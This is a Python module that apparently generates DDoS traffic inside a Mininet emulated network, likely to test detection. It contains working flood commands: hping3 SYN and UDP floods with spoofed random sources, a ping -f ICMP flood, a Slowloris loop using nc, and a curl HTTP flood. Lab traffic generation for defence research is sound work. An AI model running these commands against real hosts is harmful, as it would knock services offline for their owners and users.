"""
Attack Generation Scenarios
Multiple DDoS attack types for testing
"""

import subprocess
import time
import threading
import signal
import sys

class AttackScenarios:
    """Generate various DDoS attack scenarios"""
    
    def __init__(self, net=None):
        self.net = net
        self.attacker_host = None
        self.attack_threads = []
        self.is_running = False
        
        if net:
            try:
                self.attacker_host = net.get('h4')  # Attacker from topology
                print("✅ Attacker host ready")
            except:
                print("⚠️ Attacker host not found - use set_attacker()")
    
    def set_attacker(self, host):
        """Set attacker host"""
        self.attacker_host = host
        print(f"✅ Attacker set to {host.name}")
    
    def syn_flood_attack(self, target_ip, duration=30, intensity='high'):
        """SYN Flood Attack"""
        if not self.attacker_host:
            print("❌ No attacker host configured")
            return
        
        print(f"🔥 Starting SYN Flood on {target_ip} for {duration}s")
        
        if intensity == 'high':
            cmd = f"hping3 -S --flood --rand-source -p 80 {target_ip} &"
            rate = "High (unlimited)"
        elif intensity == 'medium':
            cmd = f"hping3 -S -c 10000 -p 80 {target_ip} &"
            rate = "Medium (10,000 packets)"
        else:
            cmd = f"hping3 -S -c 1000 -p 80 {target_ip} &"
            rate = "Low (1,000 packets)"
        
        print(f"   Rate: {rate}")
        self.attacker_host.cmd(f"timeout {duration} {cmd}")
        print(f"✅ SYN Flood attack completed")
        
    def udp_flood_attack(self, target_ip, duration=30, intensity='high'):
        """UDP Flood Attack"""
        if not self.attacker_host:
            print("❌ No attacker host configured")
            return
            
        print(f"🔥 Starting UDP Flood on {target_ip} for {duration}s")
        
        if intensity == 'high':
            cmd = f"hping3 --udp --flood --rand-source -p 53 {target_ip} &"
        else:
            cmd = f"hping3 --udp -c 5000 -p 53 {target_ip} &"
            
        self.attacker_host.cmd(f"timeout {duration} {cmd}")
        print(f"✅ UDP Flood attack completed")
        
    def icmp_flood_attack(self, target_ip, duration=30):
        """ICMP Flood Attack"""
        if not self.attacker_host:
            print("❌ No attacker host configured")
            return
            
        print(f"🔥 Starting ICMP Flood on {target_ip} for {duration}s")
        cmd = f"ping -f {target_ip} &"
        self.attacker_host.cmd(f"timeout {duration} {cmd}")
        print(f"✅ ICMP Flood attack completed")
        
    def mixed_ddos_attack(self, target_ip, duration=30):
        """Mixed DDoS Attack (SYN + UDP + ICMP)"""
        if not self.attacker_host:
            print("❌ No attacker host configured")
            return
            
        print(f"🔥 Starting Mixed DDoS on {target_ip} for {duration}s")
        
        attacks = [
            f"hping3 -S --flood -p 80 {target_ip} &",
            f"hping3 --udp --flood -p 53 {target_ip} &",
            f"ping -f {target_ip} &"
        ]
        
        threads = []
        for attack in attacks:
            t = threading.Thread(target=self.attacker_host.cmd, 
                               args=(f"timeout {duration} {attack}",))
            threads.append(t)
            t.start()
            
        for t in threads:
            t.join()
        print(f"✅ Mixed DDoS attack completed")
        
    def slowloris_attack(self, target_ip, duration=30):
        """Slowloris Attack (low and slow)"""
        if not self.attacker_host:
            print("❌ No attacker host configured")
            return
            
        print(f"🔥 Starting Slowloris on {target_ip} for {duration}s")
        
        # Create multiple partial connections
        script = f"""
        for i in $(seq 1 100); do
            (echo -n "GET / HTTP/1.1\\r\\nHost: {target_ip}\\r\\n"; sleep 10) | nc {target_ip} 80 &
            sleep 0.1
        done
        """
        self.attacker_host.cmd(f"timeout {duration} bash -c '{script}'")
        print(f"✅ Slowloris attack completed")
        
    def http_flood_attack(self, target_ip, duration=30):
        """HTTP Flood Attack"""
        if not self.attacker_host:
            print("❌ No attacker host configured")
            return
            
        print(f"🔥 Starting HTTP Flood on {target_ip} for {duration}s")
        
        script = f"""
        for i in $(seq 1 1000); do
            curl -s -o /dev/null http://{target_ip}/ & 
            sleep 0.01
        done
        """
        self.attacker_host.cmd(f"timeout {duration} bash -c '{script}'")
        print(f"✅ HTTP Flood attack completed")
        
    def run_attack_sequence(self, target_ip, duration=30):
        """Run a sequence of different attacks"""
        print("\n" + "="*60)
        print("ATTACK SEQUENCE STARTING")
        print("="*60)
        
        attacks = [
            ("SYN Flood", lambda: self.syn_flood_attack(target_ip, duration//2, 'high')),
            ("UDP Flood", lambda: self.udp_flood_attack(target_ip, duration//2, 'high')),
            ("Mixed Attack", lambda: self.mixed_ddos_attack(target_ip, duration)),
            ("Slowloris", lambda: self.slowloris_attack(target_ip, duration//2))
        ]
        
        for name, attack_func in attacks:
            print(f"\n--- {name} ---")
            attack_func()
            time.sleep(5)  # Pause between attacks
        
        print("\n" + "="*60)
        print("ATTACK SEQUENCE COMPLETED")
        print("="*60)

def example_usage():
    """Example of how to use attack scenarios"""
    from mininet.net import Mininet
    from mininet.node import RemoteController
    
    # Connect to running Mininet
    net = Mininet(controller=lambda name: RemoteController(name, ip='127.0.0.1', port=6633))
    
    # Get attacker host (assumes h4 exists)
    try:
        attacker = net.get('h4')
        
        # Create attack manager
        attacks = AttackScenarios(net)
        attacks.set_attacker(attacker)
        
        # Run attacks
        target = '10.0.0.11'  # WEB server (h11)
        
        print("\n" + "="*60)
        print("ATTACK SCENARIOS DEMONSTRATION")
        print("="*60)
        
        # Test each attack type
        attacks.syn_flood_attack(target, duration=10)
        time.sleep(2)
        
        attacks.udp_flood_attack(target, duration=10)
        time.sleep(2)
        
        attacks.icmp_flood_attack(target, duration=10)
        time.sleep(2)
        
        attacks.mixed_ddos_attack(target, duration=10)
        time.sleep(2)
        
    except Exception as e:
        print(f"Error: {e}")
        print("Make sure Mininet is running with h4 as attacker")

if __name__ == '__main__':
    example_usage()
